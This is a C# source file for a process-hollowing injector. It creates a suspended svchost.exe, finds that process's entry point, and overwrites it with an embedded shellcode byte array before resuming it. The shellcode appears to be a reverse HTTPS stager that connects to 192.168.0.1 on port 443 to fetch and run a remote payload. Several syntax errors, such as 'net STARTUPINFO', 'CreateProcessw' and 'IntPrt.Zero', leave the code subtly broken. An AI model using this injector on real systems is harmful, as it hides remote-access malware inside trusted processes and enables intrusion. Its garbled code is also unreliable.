using System;
using System.Runtime.InteropServices;
using System.Threading

namespace ProcHoll{

     class Program(){

          [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
          static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
          	IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
          		uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
          			[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

          [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
          private static extern int ZwQueryInformationProcess(IntPtr hProcess,
          	int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
          		uint ProcInfoLen, ref uint retlen);

          [DllImport("kernel32.dll", SetLastError = true)]
          static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
          	[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

           [DllImport("kernel32.dll")]
                  public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
                  	byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

          [DllImport("kernel32.dll", SetLastError = true)]
          private static extern uint ResumeThread(IntPtr hThread);

          [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
          struct STARTUPINFO
          {
               public Int32 cb;
               public string lpReserved;
               public string lpDesktop;
               public string lpTitle;
               public Int32 dwX;
               public Int32 dwY;
               public Int32 dwXSize;
               public Int32 dwYSize;
               public Int32 dwXCountChars;
               public Int32 dwYCountChars;
               public Int32 dwFillAttribute;
               public Int32 dwFlags;
               public Int16 wShowWindow;
               public Int16 cbReserved2;
               public IntPtr lpReserved2;
               public IntPtr hStdInput;
               public IntPtr hStdOutput;
               public IntPtr hStdError;
          }

          [StructLayout(LayoutKind.Sequential)]
          internal struct PROCESS_INFORMATION
          {
          public IntPtr hProcess;
          public IntPtr hThread;
          public int dwProcessId;
          public int dwThreadId;
          }

          [StructLayout(LayoutKind.Sequential)]
          internal struct PROCESS_BASIC_INFORMATION
          {
          public IntPtr Reserved1;
          public IntPtr PebAddress;
          public IntPtr Reserved2;
          public IntPtr Reserved3;
          public IntPtr UniquePid;
          public IntPtr MoreReserved;
          }

          STARTUPINFO si = net STARTUPINFO();
          PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
          PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();


          static void Main(string[] args){

               STARTUPINFO si = net STARTUPINFO();
               PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
               PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

               bool res = CreateProcessw(NULL, "C:\\Windows\\System32\\svchost.exe", IntPrt.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

               uint tmp = 0;
               internal hProcess = pi.hProcess;
               ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

               IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

               byte[] addrBuf = new byte[IntPtr.Size];
               IntPtr nRead = IntPtr.Zero;
               ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

               IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

               byte[] data = new byte[0x200];
               ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

               uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
               uint opthdr = e_lfanew_offset + 0x28;
               uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
               IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

               byte[] buf = new byte[734] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
               0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
               0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,
               0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
               0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,
               0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
               0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,0x01,0xd3,0x85,0xc9,0x74,
               0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
               0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
               0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
               0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
               0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
               0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
               0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,
               0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,
               0x53,0xe8,0x77,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,
               0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,
               0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,
               0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x34,0x5f,
               0x37,0x5f,0x32,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,
               0x62,0x4b,0x69,0x74,0x2f,0x36,0x30,0x35,0x2e,0x31,0x2e,0x31,
               0x35,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,
               0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x56,0x65,
               0x72,0x73,0x69,0x6f,0x6e,0x2f,0x31,0x37,0x2e,0x34,0x2e,0x31,
               0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x36,0x30,0x35,0x2e,
               0x31,0x2e,0x31,0x35,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,
               0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,
               0x6b,0x01,0x00,0x00,0x2f,0x76,0x76,0x31,0x71,0x4a,0x79,0x6f,
               0x75,0x48,0x45,0x64,0x67,0x71,0x47,0x47,0x70,0x42,0x78,0x54,
               0x62,0x56,0x51,0x4e,0x70,0x67,0x4c,0x77,0x42,0x76,0x76,0x2d,
               0x2d,0x6b,0x4d,0x38,0x38,0x76,0x69,0x2d,0x52,0x79,0x76,0x63,
               0x46,0x4b,0x5a,0x72,0x61,0x45,0x63,0x6c,0x57,0x74,0x68,0x36,
               0x62,0x44,0x47,0x6a,0x4e,0x4f,0x70,0x6e,0x67,0x33,0x54,0x44,
               0x4e,0x6b,0x54,0x57,0x4c,0x71,0x6b,0x5f,0x5f,0x64,0x68,0x47,
               0x73,0x61,0x61,0x5a,0x53,0x4b,0x6e,0x47,0x6c,0x68,0x64,0x64,
               0x5a,0x36,0x47,0x65,0x37,0x5a,0x7a,0x33,0x43,0x37,0x4b,0x36,
               0x44,0x69,0x41,0x57,0x43,0x39,0x6c,0x5f,0x32,0x61,0x38,0x61,
               0x53,0x6c,0x4f,0x44,0x55,0x37,0x67,0x6b,0x64,0x70,0x56,0x65,
               0x34,0x44,0x4a,0x48,0x36,0x37,0x70,0x55,0x36,0x46,0x34,0x66,
               0x42,0x47,0x49,0x72,0x4e,0x4a,0x41,0x47,0x6d,0x75,0x4a,0x51,
               0x74,0x54,0x74,0x49,0x33,0x32,0x41,0x34,0x75,0x5a,0x57,0x74,
               0x48,0x36,0x36,0x55,0x61,0x34,0x6e,0x58,0x71,0x65,0x33,0x4a,
               0x39,0x4f,0x38,0x5a,0x4c,0x6b,0x58,0x76,0x34,0x71,0x45,0x59,
               0x36,0x7a,0x6d,0x2d,0x72,0x4f,0x48,0x4a,0x55,0x79,0x35,0x4d,
               0x32,0x65,0x58,0x35,0x33,0x7a,0x46,0x32,0x51,0x30,0x50,0x76,
               0x35,0x37,0x43,0x6d,0x46,0x78,0x5f,0x00,0x50,0x68,0x57,0x89,
               0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,
               0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,
               0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,
               0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,
               0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,
               0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,0x44,
               0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x48,0x00,0x00,
               0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,
               0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,
               0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,
               0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,
               0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,
               0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,
               0x00,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,
               0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
               0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5};


               WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

               ResumeThread(pi.hThread);
          }
     }

}